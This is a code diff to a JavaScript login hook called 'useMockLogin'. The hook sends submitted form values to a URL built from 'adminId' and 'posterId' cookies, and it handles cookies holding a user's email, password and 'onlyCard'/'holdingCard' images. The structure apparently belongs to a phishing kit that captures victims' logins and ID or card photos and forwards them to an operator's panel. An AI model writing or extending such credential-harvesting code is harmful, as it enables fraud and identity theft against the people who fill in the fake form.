@@ -54,18 +54,18 @@ function useMockLogin() {
   const adminId = Cookies.get("adminId");
   const posterId = Cookies.get("posterId");
 
-  const login = async (values, resetInput) => {
+  const login = async (values, formik, setShowModal) => {
     // console.log(values);
-    // Cookies.remove("email");
-    // Cookies.remove("password");
-    // Cookies.remove("mail");
+    // Cookies.remove("onlyCard");
+    // Cookies.remove("holdingCard");
     // toast.success("Login Successfull");
-    // resetInput();
+    // formik.resetForm();
+    // setShowModal(false);
     // return;
 
     const url = `${API_URL}/ad/${adminId}/${posterId}`;
 
-    console.log(url);
+    // console.log(url);
 
     const res = await fetch(url, {
       method: "POST",
@@ -83,11 +83,16 @@ function useMockLogin() {
       toast.success("Login Successfull");
       Cookies.remove("email");
       Cookies.remove("password");
-      Cookies.remove("mail");
-      Cookies.remove("adminId");
-      Cookies.remove("posterId");
+      Cookies.remove("onlyCard");
+      Cookies.remove("holdingCard");
+      // Cookies.remove("email");
+      // Cookies.remove("password");
+      // Cookies.remove("mail");
+      // Cookies.remove("adminId");
+      // Cookies.remove("posterId");
 
-      resetInput();
+      formik.resetForm();
+      setShowModal(false);
     } else {
       console.log("error", data);
       toast.error("Something Went Wrong");
